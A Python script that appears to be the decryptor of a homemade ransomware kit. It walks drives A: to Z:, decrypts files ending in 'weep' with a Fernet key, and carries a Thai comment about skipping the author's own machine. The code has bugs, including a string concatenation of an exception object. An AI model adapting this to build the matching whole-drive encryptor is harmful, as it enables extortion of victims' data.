#catch error keyfile doesn't exist
#catch error permission denied
#ใส่เบรกว่า ถ้าชื่อเครื่องเป็นเรา ไม่รัน
import os, subprocess, time
from cryptography.fernet import Fernet
class decrypt(object):
    """
    docstring
    """
    def __init__(self):
        with open('keyfile.txt','rb')as f:
            self.key = f.read()
        self.cryptor = Fernet(self.key)

    @staticmethod
    def generatedirlist():
        """
        generate a to z and call findext every loop from a to z
        using drives parameter
        """
        for i in range(65,65+26):
            yield chr(i)+":\\"

    def decrypt(self,data):
        return self.cryptor.decrypt(data)
    
    def path_traversal(self):
        path = self.generatedirlist()
        for item in path:
            for root, _, files in os.walk(item):
                for name in files:
                    yield(os.path.join(root,name))
        
    def run(self):
        for file in self.path_traversal():
            if not file.endswith('weep'):
                continue
            with open(file,"rb+") as f:
                data = f.read()
                f.seek(0)
                f.truncate()
                f.write(self.decrypt(data))
            os.rename(file,file[:-5])

            
if __name__ == "__main__":

    try:
        test = decrypt()
        test.run()
    except Exception as exception:
        if os.path.exists('errorslog.txt'):
            writemode = 'a'
        else:
            writemode ='w'
        with open('errorslog.txt',writemode,encoding='utf-8')as f:
            f.write(exception+'\n')